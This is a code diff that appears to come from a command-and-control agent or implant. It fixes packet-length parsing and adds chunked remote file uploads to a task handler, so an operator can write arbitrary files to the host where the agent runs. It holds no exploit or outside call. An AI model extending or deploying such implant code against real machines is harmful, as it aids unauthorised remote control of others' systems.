@@ -478,10 +478,9 @@ AESc = AES encrypted using the client's session key
             packetStruct.packetNumber = BitConverter.ToUInt16(packet, 4 + offset);
             packetStruct.taskId = BitConverter.ToUInt16(packet, 6 + offset);
             packetStruct.length = BitConverter.ToUInt32(packet, 8 + offset);
-            int takeLength = 12 + (int)packetStruct.length + offset - 1;
-            byte[] dataBytes = packet.Skip(12 + offset).Take(takeLength).ToArray();
+            int dataLength = (int)packetStruct.length;
+            byte[] dataBytes = packet.Skip(12 + offset).Take(dataLength).ToArray();
             packetStruct.data = Encoding.UTF8.GetString(dataBytes);
-            byte[] remainingBytes = packet.Skip(takeLength).Take(packet.Length - takeLength).ToArray();
             packet = null;
             return packetStruct;
         }
@@ -585,12 +584,27 @@ AESc = AES encrypted using the client's session key
 
         private byte[] Task42(PACKET packet)
         {
-            string[] parts = packet.data.Split('|');
+            string[] parts = packet.data.Split(new[] { '|' }, 4);
             if (2 > parts.Length)
                 return EncodePacket(packet.type, "[!] Upload failed - No Delimiter", packet.taskId);
 
-            string fileName = parts.First();
-            string base64Part = parts[1];
+            int chunkIndex;
+            int totalChunks;
+            string fileName;
+            string base64Part;
+
+            if (parts.Length == 4 && int.TryParse(parts[0], out chunkIndex) && int.TryParse(parts[1], out totalChunks))
+            {
+                fileName = parts[2];
+                base64Part = parts[3];
+            }
+            else
+            {
+                chunkIndex = 0;
+                totalChunks = 1;
+                fileName = parts[0];
+                base64Part = parts[1];
+            }
 
             byte[] content;
             try
@@ -604,25 +618,21 @@ AESc = AES encrypted using the client's session key
 
             try
             {
-                using (FileStream fileStream = File.Open(fileName, FileMode.Create))
+                FileMode mode = (chunkIndex == 0) ? FileMode.Create : FileMode.Append;
+                using (FileStream fileStream = File.Open(fileName, mode))
                 {
                     using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
                     {
-                        try
-                        {
-                            binaryWriter.Write(content);
-                            return EncodePacket(packet.type, "[*] Upload of " + fileName + " successful", packet.taskId);
-                        }
-                        catch
-                        {
-                            return EncodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
-                        }
+                        binaryWriter.Write(content);
+                        return EncodePacket(packet.type,
+                            "[*] Upload of " + fileName + " successful (chunk " + (chunkIndex + 1) + "/" + totalChunks + ")",
+                            packet.taskId);
                     }
                 }
             }
-            catch
+            catch (Exception ex)
             {
-                return EncodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
+                return EncodePacket(packet.type, "[!] Error in writing file " + fileName + " during upload: " + ex.Message, packet.taskId);
             }
         }
 
